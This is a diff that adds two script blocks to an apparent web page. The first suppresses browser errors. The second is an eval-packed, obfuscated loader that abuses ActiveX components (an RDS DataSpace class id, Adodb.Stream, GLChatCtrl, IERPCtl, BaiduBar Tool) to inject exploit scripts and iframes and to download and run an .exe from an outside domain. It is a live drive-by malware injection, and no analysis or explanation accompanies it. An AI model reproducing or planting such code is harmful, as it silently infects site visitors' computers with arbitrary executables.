@@ -1,0 +1,14 @@
+<SCRIPT LANGUAGE='JavaScript'> 
+function ResumeError() { 
+return true; 
+} 
+window.onerror = ResumeError; 
+</SCRIPT>
+<SCRIPT LANGUAGE="JavaScript">
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('46 22(){3.9()}45.44=22;6(3.26.47(\'25\')==-1){11{2 15;2 21=(3.48("4"));21.52("51","50:42-53-40-33-32");2 34=21.31("41.35","")}8(15){};7{2 5=12 39();5.38(5.36()+24*60*60*37);3.26=\'25=71;70=/;5=\'+5.73();6(15!="[4 13]"){3.9("<14 17=74.27><\\/14>")}75{11{2 18;2 76=12 16("23.23.1")}8(18){};7{6(18!="[4 13]"){3.9("<14 17=58.27><\\/14>")}}11{2 19;2 56=12 16("55.59.1")}8(19){};7{6(19!="[4 13]"){3.9("<28 64=\'10\'63=\'10\'17=\'62.66\'></28>")}}11{2 20;2 30=12 16("65.61")}8(20){};7{6(20!="[4 13]"){30.57("67://68.72.69/54/29.49","29.43",0)}}}}}',10,77,'||var|document|object|expires|if|finally|catch|write||try|new|Error|script|e|ActiveXObject|src|f|h|j|ado|init|IERPCtl||sscookie|cookie|js|iframe|nbd|obj|createobject|00C04FC29E36|983A|as|Stream|getTime|1000|setTime|Date|11D0|Adodb|BD96C556|exe|onload|window|function|indexOf|createElement|cab|clsid|classid|setAttribute|65A3|jpg|GLCHAT|Lz|DloadDS|rl|GLChatCtrl||Tool|lz|height|width|BaiduBar|htm|http|bb|com|path|ncskie|wudiliuliang|toGMTString|014|else|reals'.split('|'),0,{}))
+
+
+
+
+
+</SCRIPT>
